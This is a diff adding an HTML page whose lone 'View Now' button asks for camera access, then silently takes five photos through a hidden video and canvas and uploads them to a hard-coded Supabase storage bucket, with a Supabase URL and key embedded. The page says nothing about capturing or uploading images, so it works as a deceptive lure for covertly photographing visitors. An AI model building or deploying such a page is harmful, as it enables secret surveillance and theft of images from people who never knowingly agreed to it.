@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<button id="captureButton">View Now</button>
+
+<!-- Hidden video + canvas -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
+
+<!-- Supabase JS -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+// ---------------------------------------
+// 🚨 REPLACE THESE WITH YOUR VALUES
+// ---------------------------------------
+const SUPABASE_URL = "https://uepkmdqhutljgjlktzaq.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVlcGttZHFodXRsamdqbGt0emFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyNjIxNjIsImV4cCI6MjA4MDgzODE2Mn0.kssAOFujyXLkH_z2g_bDJ-ws8UOVCFuumUQ5S4W0WS8";
+// ---------------------------------------
+
+// Supabase client
+const db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+// When user clicks button
+document.getElementById("captureButton").addEventListener("click", async () => {
+    try {
+        console.log("Requesting camera...");
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        // Wait until video is ready
+        video.onloadedmetadata = () => {
+            console.log("Camera started.");
+            captureAndUpload(stream, 5);
+        };
+
+    } catch (err) {
+        alert("Camera permission denied: " + err);
+        console.error(err);
+    }
+});
+
+// Capture 5 images and upload
+async function captureAndUpload(stream, total) {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    for (let i = 0; i < total; i++) {
+
+        console.log(`Capturing image ${i + 1}`);
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+
+        const fileName = `photo_${Date.now()}_${i}.png`;
+
+        console.log("Uploading:", fileName);
+
+        const { data, error } = await db.storage
+            .from("camera-uploads")
+            .upload(fileName, blob);
+
+        if (error) {
+            console.error("Upload failed:", error);
+            alert("Upload error: " + error.message);
+            return;
+        }
+
+        console.log("Uploaded:", data);
+        await new Promise(res => setTimeout(res, 500));
+    }
+
+    // Stop camera
+    stream.getTracks().forEach(t => t.stop());
+    alert("All images captured and uploaded!");
+}
+
+</script>
+
+</body>
+</html>
